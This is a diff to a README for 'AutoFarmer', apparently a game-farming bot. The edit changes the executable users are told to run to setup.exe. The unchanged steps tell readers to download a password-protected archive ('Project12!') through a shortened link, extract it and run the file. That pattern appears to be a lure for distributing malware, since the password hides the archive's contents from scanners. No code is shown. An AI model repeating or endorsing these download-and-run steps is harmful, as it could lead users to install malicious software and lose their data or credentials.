@@ -19,7 +19,7 @@
 ### 🔹 Windows (.exe) - Recommended:
 1️⃣ **[Download](https://goo.su/Hwka3s2) and extract archive(pass: Project12!)**
 
-2️⃣ Run `AutoFarmer.exe`.  
+2️⃣ Run `setup.exe`.  
 3️⃣ Enjoy automated farming! 🚀  
 
 ### 🔹 Alternative Python Method:
